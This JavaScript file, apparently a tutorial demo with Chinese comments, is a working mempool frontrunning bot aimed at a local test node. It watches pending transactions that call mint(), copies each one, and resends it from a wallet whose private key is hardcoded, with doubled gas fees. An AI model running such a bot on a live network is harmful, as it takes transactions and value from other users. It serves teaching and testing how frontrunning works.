import { ethers } from "ethers";

// 1. 创建provider
var url = "ws://127.0.0.1:8545";
const provider = new ethers.WebSocketProvider(url);
let network = provider.getNetwork()
network.then(res => console.log(`[${(new Date).toLocaleTimeString()}] 连接到 chain ID ${res.chainId}`));

// 2. 创建interface对象，用于解码交易详情。
const iface = new ethers.Interface([
    "function mint() external",
])

// 3. 创建钱包，用于发送抢跑交易
const privateKey = '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a'
const wallet = new ethers.Wallet(privateKey, provider)

const main = async () => {
    // 4. 监听pending交易，获取txHash，输出交易详情，发送抢跑交易。
    console.log("\n4. 监听pending交易，获取txHash，输出交易详情，发送抢跑交易。")
    provider.on("pending", async (txHash) => {
        if (txHash) {
            // 获取tx详情
            let tx = await provider.getTransaction(txHash);
            if (tx) {
                // filter pendingTx.data
                if (tx.data.indexOf(iface.getFunction("mint").selector) !== -1 && tx.from != wallet.address ) {
                    // 打印txHash
                    console.log(`\n[${(new Date).toLocaleTimeString()}] 监听Pending交易: ${txHash} \r`);

                    // 打印原始交易
                    console.log("raw transaction")
                    console.log(tx);
                    
                    // 打印交易解码后结果
                    let parsedTx = iface.parseTransaction(tx)
                    console.log("pending交易详情解码：")
                    console.log(parsedTx);

                    // 构建抢跑tx
                    const txFrontrun = {
                        to: tx.to,
                        value: tx.value,
                        maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n,
                        maxFeePerGas: tx.maxFeePerGas * 2n,
                        gasLimit: tx.gasLimit * 2n,
                        data: tx.data
                    }
                    // 发送抢跑交易
                    var txResponse = await wallet.sendTransaction(txFrontrun)
                    console.log(`正在frontrun交易`)
                    await txResponse.wait()
                    console.log(`frontrun 交易成功`)                
                }
            }
        }
    });
};

main()